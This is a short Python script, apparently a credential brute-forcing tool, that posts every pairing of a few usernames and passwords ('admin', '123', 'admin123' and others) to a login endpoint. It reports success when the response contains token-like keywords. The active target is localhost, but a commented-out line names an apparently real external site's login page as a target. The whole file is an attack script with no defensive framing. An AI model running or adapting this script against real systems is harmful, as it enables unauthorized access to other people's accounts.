import requests

target_url = "http://localhost:1111/auth/login"
# target_url = "https://stikomelrahma.ac.id/login"

found = False
username_payload = ['admin', 'admin123', 'anshar']
password_payload = ['admin', '123', 'admin123']
keyword_output = ['accessToken', 'token', 'access token', 'access']

for u_payload in username_payload:
    for p_payload in password_payload:
        data = {
            'username': u_payload,
            'password': p_payload,  
        }

        response = requests.post(target_url, data=data)
        # print(response.text)
        if any(keyword in response.text for keyword in keyword_output):
            print(f"Username logged use : {u_payload}")
            print(f"Password logged use : {p_payload}")
            found = True
    
if found == False:
    print("Try again with others payloads")
